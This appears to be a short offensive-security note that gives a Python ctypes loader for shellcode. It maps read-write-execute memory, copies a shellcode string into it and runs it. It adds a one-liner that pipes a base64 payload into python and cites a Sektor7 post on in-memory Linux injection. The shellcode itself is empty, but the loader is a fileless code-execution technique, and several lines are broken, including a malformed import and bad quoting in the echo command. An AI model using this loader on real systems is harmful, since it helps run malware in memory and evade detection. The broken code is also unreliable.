# Python

```python
from ctypes.import (CDLL, c_void_p, c_size_t, c_int, c_long, memmove, CFUNCTYPE, cast, pythonapi)
from ctypes.util import (find_library)
from sys import exit

PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC = 0x04
MAP_PRIVATE = 0x02
MAP_ANONYMOUS = 0x20
ENOMEM = -1

# $ base64 -w 0 payload.py
shellcode = ""

libc = CDLL(find_library('c'))

# C language equivalence
# void *mmap(void *address, size_t length, int prot, int flags, int fildes, off_t off);
mmap = libc.mmap
mmap.argtypes = [ c_void_p, c_size_t, c_int, c_int, c_int, c_size_t ]
mmap.restype = c_void_p

page_size = pythonapi.getpagesize()
shellcode_length = len(shellcode)
memory_size = page_size * (1 + shellcode_length / page_size)

cpointer = mmap(0, memory_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)

if cpointer == ENOMEM:
    exit("mmap() memory allocation error")

if shellcode_length <= memory_size:
    memmove(cpointer, shellcode, shellcode_length)
    memory = CFUNCTYPE(c_void_p, c_void_p)
    execute_memory = cast(cpointer, memory)
    execute_memory(None)
```

To execute the payload.

```
$ echo "exec('<base64_payload>').decode('base64')) | python"
```

---
## References

### Sektor7

- [Sektor7: Pure In-Memory (Shell)Code Injection In Linux Userland](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md)